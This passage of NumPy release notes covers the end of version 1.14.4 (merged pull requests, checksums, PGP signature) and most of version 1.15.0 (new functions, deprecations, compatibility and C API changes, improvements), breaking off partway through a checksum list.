Virtanen\n* Ryan Soklaski +\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 11 pull requests were merged for this release.\n\n* `11104 <https://github.com/numpy/numpy/pull/11104>`__: BUG: str of DOUBLE_DOUBLE format wrong on ppc64\n* `11170 <https://github.com/numpy/numpy/pull/11170>`__: TST: linalg: add regression test for gh-8577\n* `11174 <https://github.com/numpy/numpy/pull/11174>`__: MAINT: add sanity-checks to be run at import time\n* `11181 <https://github.com/numpy/numpy/pull/11181>`__: BUG: void dtype setup checked offset not actual pointer for alignment\n* `11194 <https://github.com/numpy/numpy/pull/11194>`__: BUG: Python2 doubles don't print correctly in interactive shell.\n* `11198 <https://github.com/numpy/numpy/pull/11198>`__: BUG: optimizing compilers can reorder call to npy_get_floatstatus\n* `11199 <https://github.com/numpy/numpy/pull/11199>`__: BUG: reduce using SSE only warns if inside SSE loop\n* `11203 <https://github.com/numpy/numpy/pull/11203>`__: BUG: Bytes delimiter/comments in genfromtxt should be decoded\n* `11211 <https://github.com/numpy/numpy/pull/11211>`__: BUG: Fix reference count/memory leak exposed by better testing\n* `11219 <https://github.com/numpy/numpy/pull/11219>`__: BUG: Fixes einsum broadcasting bug when optimize=True\n* `11251 <https://github.com/numpy/numpy/pull/11251>`__: DOC: Document 1.14.4 release.\n\nChecksums\n=========\n\nMD5\n- ---\n\n    118e010f76fba91f05111e775d08b9d2  numpy-1.14.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a08af11af72e8393d61f1724e2a42258  numpy-1.14.4-cp27-cp27m-manylinux1_i686.whl\n    bbf56f4de32bb2c4215e01ea4f1b9445  numpy-1.14.4-cp27-cp27m-manylinux1_x86_64.whl\n    b5e17dcc08205a278ffd33c6baeb7562  numpy-1.14.4-cp27-cp27mu-manylinux1_i686.whl\n    e6844d6134fed4f79b52cd89d66edb76  numpy-1.14.4-cp27-cp27mu-manylinux1_x86_64.whl\n    e9d4ab30ffee0f57da2292ed2c42bdcb  numpy-1.14.4-cp27-none-win32.whl\n    ff04e3451a90fdf9ae8b6db8b3e8c2d6  numpy-1.14.4-cp27-none-win_amd64.whl\n    fbe6a5a9a0de9f85bcb729702a132769  numpy-1.14.4-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    33a177cf9d60fa26d30dc80b7163a374  numpy-1.14.4-cp34-cp34m-manylinux1_i686.whl\n    6335ee571648d8db7561a619328b69c7  numpy-1.14.4-cp34-cp34m-manylinux1_x86_64.whl\n    e53dd3796a0cdec43037b18c5c54d1a3  numpy-1.14.4-cp34-none-win32.whl\n    aab911c898c58073b47a2d1f28228a41  numpy-1.14.4-cp34-none-win_amd64.whl\n    a05e215d9443c838a531119eb5c1eadc  numpy-1.14.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7c5f7ff2cccb13c22b87f768ac1cc6e2  numpy-1.14.4-cp35-cp35m-manylinux1_i686.whl\n    d22105d03a15c9fd6ec4ecffa4b1f764  numpy-1.14.4-cp35-cp35m-manylinux1_x86_64.whl\n    7a5d4c66c7f6e430eb73b5683d99cacb  numpy-1.14.4-cp35-none-win32.whl\n    cf0c074d9243f8bf6eff8291ac12a003  numpy-1.14.4-cp35-none-win_amd64.whl\n    79233bdad30a65beb515c86a4612102d  numpy-1.14.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    135139bd2ec26e2b52bdd2d36be94c44  numpy-1.14.4-cp36-cp36m-manylinux1_i686.whl\n    9c56d525cf6da2b8489e723d72ccc9a2  numpy-1.14.4-cp36-cp36m-manylinux1_x86_64.whl\n    ec9af9e19aac597e1a245ada9c333e2d  numpy-1.14.4-cp36-none-win32.whl\n    f8ec9c6167f2b0d08066ec78c3a01a4c  numpy-1.14.4-cp36-none-win_amd64.whl\n    7de00fc3be91a3ab913d4efe206b3928  numpy-1.14.4.tar.gz\n    a8a23723342a561e579757553e9db73a  numpy-1.14.4.zip\n\nSHA256\n- ------\n\n    c0c4bdcb771a147cb14286e3aeb72267e1664652d4150b0df255f0c210166a62  numpy-1.14.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    939376b3b8d9bd42529a2713534c9bae7f11c774614d4d2f7f2a38cae96101f1  numpy-1.14.4-cp27-cp27m-manylinux1_i686.whl\n    6105d909e56c4f3f173a7294154eee5da80853104e9c3ebcf9e523fb3bb6cf70  numpy-1.14.4-cp27-cp27m-manylinux1_x86_64.whl\n    3ed68b8ef0635e12b06c216d3ed33572d9c15b05a5a5d6ab870d073190c3eef3  numpy-1.14.4-cp27-cp27mu-manylinux1_i686.whl\n    1dc831683f18c11e6b5b7ad3610b9f00417b8d3fc63a8adcdbe68844d9dd6f62  numpy-1.14.4-cp27-cp27mu-manylinux1_x86_64.whl\n    8d87ac65d830ee3087e6bd02b0201e68aed4c715ff2e227e3640e7ded38d8a2e  numpy-1.14.4-cp27-none-win32.whl\n    7fbceea93b6877419d84516705a265dfc4626939a29107a4d04db599bf6cdf8d  numpy-1.14.4-cp27-none-win_amd64.whl\n    a1b4a80d59658fc438716095deb1971c6315482b461d976f760d920b6509fd5d  numpy-1.14.4-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ef7a07f6a77658a1038e6d22e53458129c04a95b5770f080b5741320d9491e32  numpy-1.14.4-cp34-cp34m-manylinux1_i686.whl\n    c5065b3aec37cd1b7ec2882b3ab86e200d15219a0fb96fea65a16c6b59d3c0f0  numpy-1.14.4-cp34-cp34m-manylinux1_x86_64.whl\n    b2b2741da83b1e016094b2fef2cadec1abd3ccd3d97428634ec6afe1dcb699b8  numpy-1.14.4-cp34-none-win32.whl\n    419dfe9bcb09d2e87ecf296c5ebf2b047c568419c89588acc9dbce6d2d761bea  numpy-1.14.4-cp34-none-win_amd64.whl\n    be4664fe153ca6dbd961fb06f99b9b88b114ab44649376253b540aafbf42e469  numpy-1.14.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    0d6d7bbcb54babaf39fe658bcc6f79641c9c62813c6d477802d783c7ba1a437c  numpy-1.14.4-cp35-cp35m-manylinux1_i686.whl\n    f54114395aabe13c7c4e4b425145cfd998eaf0781e87a9e9b2e77426f1ec8a82  numpy-1.14.4-cp35-cp35m-manylinux1_x86_64.whl\n    eb6ccd2b47d43199ec9a7c39bd45e399ccb5756e7367aaf92ced3c46fa67b16b  numpy-1.14.4-cp35-none-win32.whl\n    f6a4ae8d5e1126bf4d8520a9aa6a82d067ab3ce7d21f58f0d50ead2aebda7bfb  numpy-1.14.4-cp35-none-win_amd64.whl\n    b037993dfb1175a68b6a2bfc6b1c2af57c09031d1332fea3ab25a539b43bd475  numpy-1.14.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    e6c24c83ca64d447a18f041bd53cbe96c74405f59939b6006755105583b62629  numpy-1.14.4-cp36-cp36m-manylinux1_i686.whl\n    f29a9c5607b0fded7a9f0871dbd06918a88cb0a465acfac5c67f92d1a4115d48  numpy-1.14.4-cp36-cp36m-manylinux1_x86_64.whl\n    d9ceb6c680ffbe55ef6cf9d93558e0ddb72d616b885d77c536920f3da2112703  numpy-1.14.4-cp36-none-win32.whl\n    9e6694912f13afd8b1e15aa8002e9c951a377c94080c5442de154d743a69b3ff  numpy-1.14.4-cp36-none-win_amd64.whl\n    c9a83644685edf8b5383b7632daa37df115b41aa20ca6ec3139e707d88f7c903  numpy-1.14.4.tar.gz\n    2185a0f31ecaa0792264fa968c8e0ba6d96acf144b26e2e1d1cd5b77fc11a691  numpy-1.14.4.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbGBeAAAoJEGefIoN3xSR7MnYH/jec7EEiAwHEmxmJEpbNABpk\n0eHvRfBE7oRIW5d862hpoJKYkjO2mVAorKEPYCWEbXDoVgli744fvbb4WIFb1C+H\nz6iXN8YMVtwFBdDX+PrrH2hqFWEo9ATUbG8I9/nHjcj2sm8MurmDSXrQwyxUd5RL\nwpV4dAnpJTmFAhaHUdnt2uFUmZm4u2pS1SRpknCvNWrKWa9Vj07E08I+lODzmyvr\nXgPUK4K9TBuJ9psGGpRrqoFK9CV/Lb61gCZljjUwXVvPtsXlBoLg/J0BYzvnn8zs\nqLeiUNaPSoe7nT9vjb/RV8V279KFZxWu26xOtYNJs0eIW8bvcVondWhBP+G0zKk=\n=LNWG\n-----END PGP SIGNATURE-----\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.15.0": "==========================\n\nNumPy 1.15.0 is a release with an unusual number of cleanups, many deprecations\nof old functions, and improvements to many existing functions. Please read the\ndetailed descriptions below to see if you are affected.\n\nFor testing, we have switched to pytest as a replacement for the no longer\nmaintained nose framework. The old nose based interface remains for downstream\nprojects who may still be using it.\n\nThe Python versions supported by this release are 2.7, 3.4-3.7. The wheels are\nlinked with OpenBLAS v0.3.0, which should fix some of the linalg problems\nreported for NumPy 1.14.\n\n\nHighlights\n==========\n\n* NumPy has switched to pytest for testing.\n* A new  `numpy.printoptions` context manager.\n* Many improvements to the histogram functions.\n* Support for unicode field names in python 2.7.\n* Improved support for PyPy.\n* Fixes and improvements to `numpy.einsum`.\n\n\nNew functions\n=============\n\n* `numpy.gcd` and `numpy.lcm`, to compute the greatest common divisor and least\n  common multiple.\n\n* `numpy.ma.stack`, the `numpy.stack` array-joining function generalized to\n  masked arrays.\n\n* `numpy.quantile` function, an interface to ``percentile`` without factors of\n  100\n\n* `numpy.nanquantile` function, an interface to ``nanpercentile`` without\n  factors of 100\n\n* `numpy.printoptions`, a context manager that sets print options temporarily\n  for the scope of the ``with`` block::\n\n    >>> with np.printoptions(precision=2):\n    ...     print(np.array([2.0]) / 3)\n    [0.67]\n\n* `numpy.histogram_bin_edges`, a function to get the edges of the bins used by a\n  histogram without needing to calculate the histogram.\n\n* C functions `npy_get_floatstatus_barrier` and `npy_clear_floatstatus_barrier`\n  have been added to deal with compiler optimization changing the order of\n  operations.  See below for details.\n\n\nDeprecations\n============\n\n* Aliases of builtin `pickle` functions are deprecated, in favor of their\n  unaliased ``pickle.<func>`` names:\n\n  * `numpy.loads`\n  * `numpy.core.numeric.load`\n  * `numpy.core.numeric.loads`\n  * `numpy.ma.loads`, `numpy.ma.dumps`\n  * `numpy.ma.load`, `numpy.ma.dump` - these functions already failed on\n    python 3 when called with a string.\n\n* Multidimensional indexing with anything but a tuple is deprecated. This means\n  that the index list in ``ind = [slice(None), 0]; arr[ind]`` should be changed\n  to a tuple, e.g., ``ind = [slice(None), 0]; arr[tuple(ind)]`` or\n  ``arr[(slice(None), 0)]``. That change is necessary to avoid ambiguity in\n  expressions such as ``arr[[[0, 1], [0, 1]]]``, currently interpreted as\n  ``arr[array([0, 1]), array([0, 1])]``, that will be interpreted\n  as ``arr[array([[0, 1], [0, 1]])]`` in the future.\n\n* Imports from the following sub-modules are deprecated, they will be removed\n  at some future date.\n\n  * `numpy.testing.utils`\n  * `numpy.testing.decorators`\n  * `numpy.testing.nosetester`\n  * `numpy.testing.noseclasses`\n  * `numpy.core.umath_tests`\n\n* Giving a generator to `numpy.sum` is now deprecated. This was undocumented\n  behavior, but worked. Previously, it would calculate the sum of the generator\n  expression.  In the future, it might return a different result. Use\n  ``np.sum(np.from_iter(generator))`` or the built-in Python ``sum`` instead.\n\n* Users of the C-API should call ``PyArrayResolveWriteBackIfCopy`` or\n  ``PyArray_DiscardWritbackIfCopy`` on any array with the ``WRITEBACKIFCOPY``\n  flag set, before deallocating the array. A deprecation warning will be\n  emitted if those calls are not used when needed.\n\n* Users of ``nditer`` should use the nditer object as a context manager\n  anytime one of the iterator operands is writeable, so that numpy can\n  manage writeback semantics, or should call ``it.close()``. A\n `RuntimeWarning` may be emitted otherwise in these cases.\n\n* The ``normed`` argument of ``np.histogram``, deprecated long ago in 1.6.0,\n  now emits a ``DeprecationWarning``.\n\n\nFuture Changes\n==============\n\n* NumPy 1.16 will drop support for Python 3.4.\n* NumPy 1.17 will drop support for Python 2.7.\n\n\nCompatibility notes\n===================\n\nCompiled testing modules renamed and made private\n- -------------------------------------------------\nThe following compiled modules have been renamed and made private:\n\n* ``umath_tests`` -> ``_umath_tests``\n* ``test_rational`` -> ``_rational_tests``\n* ``multiarray_tests`` -> ``_multiarray_tests``\n* ``struct_ufunc_test`` -> ``_struct_ufunc_tests``\n* ``operand_flag_tests`` -> ``_operand_flag_tests``\n\nThe ``umath_tests`` module is still available for backwards compatibility, but\nwill be removed in the future.\n\nThe ``NpzFile`` returned by ``np.savez`` is now a ``collections.abc.Mapping``\n- -----------------------------------------------------------------------------\nThis means it behaves like a readonly dictionary, and has a new ``.values()``\nmethod and ``len()`` implementation.\n\nFor python 3, this means that ``.iteritems()``, ``.iterkeys()`` have been\ndeprecated, and ``.keys()`` and ``.items()`` now return views and not lists.\nThis is consistent with how the builtin ``dict`` type changed between python 2\nand python 3.\n\nUnder certain conditions, ``nditer`` must be used in a context manager\n- ----------------------------------------------------------------------\nWhen using an `numpy.nditer` with the ``\"writeonly\"`` or ``\"readwrite\"`` flags, there\nare some circumstances where nditer doesn't actually give you a view of the\nwritable array. Instead, it gives you a copy, and if you make changes to the\ncopy, nditer later writes those changes back into your actual array. Currently,\nthis writeback occurs when the array objects are garbage collected, which makes\nthis API error-prone on CPython and entirely broken on PyPy. Therefore,\n``nditer`` should now be used as a context manager whenever it is used\nwith writeable arrays, e.g., ``with np.nditer(...) as it: ...``. You may also\nexplicitly call ``it.close()`` for cases where a context manager is unusable,\nfor instance in generator expressions.\n\nNumpy has switched to using pytest instead of nose for testing\n- --------------------------------------------------------------\nThe last nose release was 1.3.7 in June, 2015, and development of that tool has\nended, consequently NumPy has now switched to using pytest. The old decorators\nand nose tools that were previously used by some downstream projects remain\navailable, but will not be maintained. The standard testing utilities,\n``assert_almost_equal`` and such, are not be affected by this change except for\nthe nose specific functions ``import_nose`` and ``raises``. Those functions are\nnot used in numpy, but are kept for downstream compatibility.\n\nNumpy no longer monkey-patches ``ctypes`` with ``__array_interface__``\n- ----------------------------------------------------------------------\nPreviously numpy added ``__array_interface__`` attributes to all the integer\ntypes from ``ctypes``.\n\n``np.ma.notmasked_contiguous`` and ``np.ma.flatnotmasked_contiguous`` always return lists\n- -----------------------------------------------------------------------------------------\nThis is the documented behavior, but previously the result could be any of\nslice, None, or list.\n\nAll downstream users seem to check for the ``None`` result from\n``flatnotmasked_contiguous`` and replace it with ``[]``.  Those callers will\ncontinue to work as before.\n\n``np.squeeze`` restores old behavior of objects that cannot handle an ``axis`` argument\n- ---------------------------------------------------------------------------------------\nPrior to version ``1.7.0``, `numpy.squeeze` did not have an ``axis`` argument and\nall empty axes were removed by default. The incorporation of an ``axis``\nargument made it possible to selectively squeeze single or multiple empty axes,\nbut the old API expectation was not respected because axes could still be\nselectively removed (silent success) from an object expecting all empty axes to\nbe removed. That silent, selective removal of empty axes for objects expecting\nthe old behavior has been fixed and the old behavior restored.\n\nunstructured void array's ``.item`` method now returns a bytes object\n- ---------------------------------------------------------------------\n``.item`` now returns a ``bytes`` object instead of a buffer or byte array.\nThis may affect code which assumed the return value was mutable, which is no\nlonger the case.\n\n``copy.copy`` and ``copy.deepcopy`` no longer turn ``masked`` into an array\n- ---------------------------------------------------------------------------\nSince ``np.ma.masked`` is a readonly scalar, copying should be a no-op. These\nfunctions now behave consistently with ``np.copy()``.\n\nMultifield Indexing of Structured Arrays will still return a copy\n- -----------------------------------------------------------------\nThe change that multi-field indexing of structured arrays returns a view\ninstead of a copy is pushed back to 1.16. A new method\n``numpy.lib.recfunctions.repack_fields`` has been introduced to help mitigate\nthe effects of this change, which can be used to write code compatible with\nboth numpy 1.15 and 1.16. For more information on how to update code to account\nfor this future change see the \"accessing multiple fields\" section of the\n`user guide <https://docs.scipy.org/doc/numpy/user/basics.rec.html>`__.\n\n\nC API changes\n=============\n\nNew functions ``npy_get_floatstatus_barrier`` and ``npy_clear_floatstatus_barrier``\n- -----------------------------------------------------------------------------------\nFunctions ``npy_get_floatstatus_barrier`` and ``npy_clear_floatstatus_barrier``\nhave been added and should be used in place of the ``npy_get_floatstatus``and\n``npy_clear_status`` functions. Optimizing compilers like GCC 8.1 and Clang\nwere rearranging the order of operations when the previous functions were used\nin the ufunc SIMD functions, resulting in the floatstatus flags being checked\nbefore the operation whose status we wanted to check was run.  See `10339\n<https://github.com/numpy/numpy/issues/10370>`__.\n\nChanges to ``PyArray_GetDTypeTransferFunction``\n- -----------------------------------------------\n``PyArray_GetDTypeTransferFunction`` now defaults to using user-defined\n``copyswapn`` / ``copyswap`` for user-defined dtypes. If this causes a\nsignificant performance hit, consider implementing ``copyswapn`` to reflect the\nimplementation of ``PyArray_GetStridedCopyFn``.  See `10898\n<https://github.com/numpy/numpy/pull/10898>`__.\n* Functions ``npy_get_floatstatus_barrier`` and ``npy_clear_floatstatus_barrier``\n  have been added and should be used in place of the ``npy_get_floatstatus``and\n  ``npy_clear_status`` functions. Optimizing compilers like GCC 8.1 and Clang\n  were rearranging the order of operations when the previous functions were\n  used in the ufunc SIMD functions, resulting in the floatstatus flags being '\n  checked before the operation whose status we wanted to check was run.\n  See `10339 <https://github.com/numpy/numpy/issues/10370>`__.\n\n\nNew Features\n============\n\n``np.gcd`` and ``np.lcm`` ufuncs added for integer and objects types\n- --------------------------------------------------------------------\nThese compute the greatest common divisor, and lowest common multiple,\nrespectively. These work on all the numpy integer types, as well as the\nbuiltin arbitrary-precision ``Decimal`` and ``long`` types.\n\nSupport for cross-platform builds for iOS\n- -----------------------------------------\nThe build system has been modified to add support for the\n``_PYTHON_HOST_PLATFORM`` environment variable, used by ``distutils`` when\ncompiling on one platform for another platform. This makes it possible to\ncompile NumPy for iOS targets.\n\nThis only enables you to compile NumPy for one specific platform at a time.\nCreating a full iOS-compatible NumPy package requires building for the 5\narchitectures supported by iOS (i386, x86_64, armv7, armv7s and arm64), and\ncombining these 5 compiled builds products into a single \"fat\" binary.\n\n``return_indices`` keyword added for ``np.intersect1d``\n- -------------------------------------------------------\nNew keyword ``return_indices`` returns the indices of the two input arrays\nthat correspond to the common elements.\n\n``np.quantile`` and ``np.nanquantile``\n- --------------------------------------\nLike ``np.percentile`` and ``np.nanpercentile``, but takes quantiles in [0, 1]\nrather than percentiles in [0, 100]. ``np.percentile`` is now a thin wrapper\naround ``np.quantile`` with the extra step of dividing by 100.\n\n\nBuild system\n- ------------\nAdded experimental support for the 64-bit RISC-V architecture.\n\n\nImprovements\n============\n\n``np.einsum`` updates\n- ---------------------\nSyncs einsum path optimization tech between `numpy` and `opt_einsum`. In\nparticular, the `greedy` path has received many enhancements by jcmgray. A\nfull list of issues fixed are:\n\n* Arbitrary memory can be passed into the `greedy` path. Fixes gh-11210.\n* The greedy path has been updated to contain more dynamic programming ideas\n  preventing a large number of duplicate (and expensive) calls that figure out\n  the actual pair contraction that takes place. Now takes a few seconds on\n  several hundred input tensors. Useful for matrix product state theories.\n* Reworks the broadcasting dot error catching found in gh-11218 gh-10352 to be\n  a bit earlier in the process.\n* Enhances the `can_dot` functionality that previous missed an edge case (part\n  of gh-11308).\n\n``np.ufunc.reduce`` and related functions now accept an initial value\n- ---------------------------------------------------------------------\n``np.ufunc.reduce``, ``np.sum``, ``np.prod``, ``np.min`` and ``np.max`` all\nnow accept an ``initial`` keyword argument that specifies the value to start\nthe reduction with.\n\n``np.flip`` can operate over multiple axes\n- ------------------------------------------\n``np.flip`` now accepts None, or tuples of int, in its ``axis`` argument. If\naxis is None, it will flip over all the axes.\n\n``histogram`` and ``histogramdd`` functions have moved to ``np.lib.histograms``\n- -------------------------------------------------------------------------------\nThese were originally found in ``np.lib.function_base``. They are still\navailable under their un-scoped ``np.histogram(dd)`` names, and\nto maintain compatibility, aliased at ``np.lib.function_base.histogram(dd)``.\n\nCode that does ``from np.lib.function_base import *`` will need to be updated\nwith the new location, and should consider not using ``import *`` in future.\n\n``histogram`` will accept NaN values when explicit bins are given\n- -----------------------------------------------------------------\nPreviously it would fail when trying to compute a finite range for the data.\nSince the range is ignored anyway when the bins are given explicitly, this error\nwas needless.\n\nNote that calling ``histogram`` on NaN values continues to raise the\n``RuntimeWarning`` s typical of working with nan values, which can be silenced\nas usual with ``errstate``.\n\n``histogram`` works on datetime types, when explicit bin edges are given\n- ------------------------------------------------------------------------\nDates, times, and timedeltas can now be histogrammed. The bin edges must be\npassed explicitly, and are not yet computed automatically.\n\n``histogram`` \"auto\" estimator handles limited variance better\n- --------------------------------------------------------------\nNo longer does an IQR of 0 result in ``n_bins=1``, rather the number of bins\nchosen is related to the data size in this situation.\n\nThe edges retuned by `histogram`` and ``histogramdd`` now match the data float type\n- -----------------------------------------------------------------------------------\nWhen passed ``np.float16``, ``np.float32``, or ``np.longdouble`` data, the\nreturned edges are now of the same dtype. Previously, ``histogram`` would only\nreturn the same type if explicit bins were given, and ``histogram`` would\nproduce ``float64`` bins no matter what the inputs.\n\n``histogramdd`` allows explicit ranges to be given in a subset of axes\n- ----------------------------------------------------------------------\nThe ``range`` argument of `numpy.histogramdd` can now contain ``None`` values to\nindicate that the range for the corresponding axis should be computed from the\ndata. Previously, this could not be specified on a per-axis basis.\n\nThe normed arguments of ``histogramdd`` and ``histogram2d`` have been renamed\n- -----------------------------------------------------------------------------\nThese arguments are now called ``density``, which is consistent with\n``histogram``. The old argument continues to work, but the new name should be\npreferred.\n\n``np.r_`` works with 0d arrays, and ``np.ma.mr_`` works with ``np.ma.masked``\n- -----------------------------------------------------------------------------\n0d arrays passed to the `r_` and `mr_` concatenation helpers are now treated as\nthough they are arrays of length 1. Previously, passing these was an error.\nAs a result, `numpy.ma.mr_` now works correctly on the ``masked`` constant.\n\n``np.ptp`` accepts a ``keepdims`` argument, and extended axis tuples\n- --------------------------------------------------------------------\n``np.ptp`` (peak-to-peak) can now work over multiple axes, just like ``np.max``\nand ``np.min``.\n\n``MaskedArray.astype`` now is identical to ``ndarray.astype``\n- -------------------------------------------------------------\nThis means it takes all the same arguments, making more code written for\nndarray work for masked array too.\n\nEnable AVX2/AVX512 at compile time\n- ----------------------------------\nChange to simd.inc.src to allow use of AVX2 or AVX512 at compile time. Previously\ncompilation for avx2 (or 512) with -march=native would still use the SSE\ncode for the simd functions even when the rest of the code got AVX2.\n\n``nan_to_num`` always returns scalars when receiving scalar or 0d inputs\n- ------------------------------------------------------------------------\nPreviously an array was returned for integer scalar inputs, which is\ninconsistent with the behavior for float inputs, and that of ufuncs in general.\nFor all types of scalar or 0d input, the result is now a scalar.\n\n``np.flatnonzero`` works on numpy-convertible types\n- ---------------------------------------------------\n``np.flatnonzero`` now uses ``np.ravel(a)`` instead of ``a.ravel()``, so it\nworks for lists, tuples, etc.\n\n``np.interp`` returns numpy scalars rather than builtin scalars\n- ---------------------------------------------------------------\nPreviously ``np.interp(0.5, [0, 1], [10, 20])`` would return a ``float``, but\nnow it returns a ``np.float64`` object, which more closely matches the behavior\nof other functions.\n\nAdditionally, the special case of ``np.interp(object_array_0d, ...)`` is no\nlonger supported, as ``np.interp(object_array_nd)`` was never supported anyway.\n\nAs a result of this change, the ``period`` argument can now be used on 0d\narrays.\n\nAllow dtype field names to be unicode in Python 2\n- -------------------------------------------------\nPreviously ``np.dtype([(u'name', float)])`` would raise a ``TypeError`` in\nPython 2, as only bytestrings were allowed in field names. Now any unicode\nstring field names will be encoded with the ``ascii`` codec, raising a\n``UnicodeEncodeError`` upon failure.\n\nThis change makes it easier to write Python 2/3 compatible code using\n``from __future__ import unicode_literals``, which previously would cause\nstring literal field names to raise a TypeError in Python 2.\n\nComparison ufuncs accept ``dtype=object``, overriding the default ``bool``\n- --------------------------------------------------------------------------\nThis allows object arrays of symbolic types, which override ``==`` and other\noperators to return expressions, to be compared elementwise with\n``np.equal(a, b, dtype=object)``.\n\n``sort`` functions accept ``kind='stable'``\n- -------------------------------------------\nUp until now, to perform a stable sort on the data, the user must do:\n\n    >>> np.sort([5, 2, 6, 2, 1], kind='mergesort')\n    [1, 2, 2, 5, 6]\n\nbecause merge sort is the only stable sorting algorithm available in\nNumPy. However, having kind='mergesort' does not make it explicit that\nthe user wants to perform a stable sort thus harming the readability.\n\nThis change allows the user to specify kind='stable' thus clarifying\nthe intent.\n\nDo not make temporary copies for in-place accumulation\n- ------------------------------------------------------\nWhen ufuncs perform accumulation they no longer make temporary copies because\nof the overlap between input an output, that is, the next element accumulated\nis added before the accumulated result is stored in its place, hence the\noverlap is safe. Avoiding the copy results in faster execution.\n\n``linalg.matrix_power`` can now handle stacks of matrices\n- ---------------------------------------------------------\nLike other functions in ``linalg``, ``matrix_power`` can now deal with arrays\nof dimension larger than 2, which are treated as stacks of matrices. As part\nof the change, to further improve consistency, the name of the first argument\nhas been changed to ``a`` (from ``M``), and the exceptions for non-square\nmatrices have been changed to ``LinAlgError`` (from ``ValueError``).\n\nIncreased performance in ``random.permutation`` for multidimensional arrays\n- ---------------------------------------------------------------------------\n``permutation`` uses the fast path in ``random.shuffle`` for all input\narray dimensions.  Previously the fast path was only used for 1-d arrays.\n\nGeneralized ufuncs now accept ``axes``, ``axis`` and ``keepdims`` arguments\n- ---------------------------------------------------------------------------\nOne can control over which axes a generalized ufunc operates by passing in an\n``axes`` argument, a list of tuples with indices of particular axes.  For\ninstance, for a signature of ``(i,j),(j,k)->(i,k)`` appropriate for matrix\nmultiplication, the base elements are two-dimensional matrices and these are\ntaken to be stored in the two last axes of each argument.  The corresponding\naxes keyword would be ``[(-2, -1), (-2, -1), (-2, -1)]``. If one wanted to\nuse leading dimensions instead, one would pass in ``[(0, 1), (0, 1), (0, 1)]``.\n\nFor simplicity, for generalized ufuncs that operate on 1-dimensional arrays\n(vectors), a single integer is accepted instead of a single-element tuple, and\nfor generalized ufuncs for which all outputs are scalars, the (empty) output\ntuples can be omitted.  Hence, for a signature of ``(i),(i)->()`` appropriate\nfor an inner product, one could pass in ``axes=[0, 0]`` to indicate that the\nvectors are stored in the first dimensions of the two inputs arguments.\n\nAs a short-cut for generalized ufuncs that are similar to reductions, i.e.,\nthat act on a single, shared core dimension such as the inner product example\nabove, one can pass an ``axis`` argument. This is equivalent to passing in\n``axes`` with identical entries for all arguments with that core dimension\n(e.g., for the example above, ``axes=[(axis,), (axis,)]``).\n\nFurthermore, like for reductions, for generalized ufuncs that have inputs that\nall have the same number of core dimensions and outputs with no core dimension,\none can pass in ``keepdims`` to leave a dimension with size 1 in the outputs,\nthus allowing proper broadcasting against the original inputs. The location of\nthe extra dimension can be controlled with ``axes``. For instance, for the\ninner-product example, ``keepdims=True, axes=[-2, -2, -2]`` would act on the\ninner-product example, ``keepdims=True, axis=-2`` would act on the\none-but-last dimension of the input arguments, and leave a size 1 dimension in\nthat place in the output.\n\nfloat128 values now print correctly on ppc systems\n- --------------------------------------------------\nPreviously printing float128 values was buggy on ppc, since the special\ndouble-double floating-point-format on these systems was not accounted for.\nfloat128s now print with correct rounding and uniqueness.\n\nWarning to ppc users: You should upgrade glibc if it is version <=2.23,\nespecially if using float128. On ppc, glibc's malloc in these version often\nmisaligns allocated memory which can crash numpy when using float128 values.\n\nNew ``np.take_along_axis`` and ``np.put_along_axis`` functions\n- --------------------------------------------------------------\nWhen used on multidimensional arrays, ``argsort``, ``argmin``, ``argmax``, and\n``argpartition`` return arrays that are difficult to use as indices.\n``take_along_axis`` provides an easy way to use these indices to lookup values\nwithin an array, so that::\n\n    np.take_along_axis(a, np.argsort(a, axis=axis), axis=axis)\n\nis the same as::\n\n    np.sort(a, axis=axis)\n\n``np.put_along_axis`` acts as the dual operation for writing to these indices\nwithin an array.\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    4957a50c1125fdecb4cb51829f5feba1  numpy-1.15.0-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d5ffa73c6a3eeba8cfcab283e7db3c2f  numpy-1.15.0-cp27-cp27m-manylinux1_i686.whl\n    a6f7aa33d4d1598dc33831a4bb36570d  numpy-1.15.0-cp27-cp27m-manylinux1_x86_64.whl\n    cbdd2291782deb29f41c9b7d121264e0  numpy-1.15.0-cp27-cp27mu-manylinux1_i686.whl\n    0bd79da73435161850099bfcacc75fae  numpy-1.15.0-cp27-cp27mu-manylinux1_x86_64.whl\n    73f930c046ac09e518d0b4cf2f8ff642  numpy-1.15.0-cp27-none-win32.whl\n    7ba5b463728a792dced42fd6259e511f  numpy-1.15.0-cp27-none-win_amd64.whl\n    badfc9f713510d59f478037c88b3d963  numpy-1.15.0-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    662f2536cac7b841f86e9b7488e52371  numpy-1.15.0-cp34-cp34m-manylinux1_i686.whl\n    346d9239f7f12bb7042f8bc847928dc1  numpy-1.15.0-cp34-cp34m-manylinux1_x86_64.whl\n    fd03012584359cd05cee08408df5897d  numpy-1.15.0-cp34-none-win32.whl\n    1032db03cefd82e87f72f2b04b15b7ae  numpy-1.15.0-cp34-none-win_amd64.whl\n    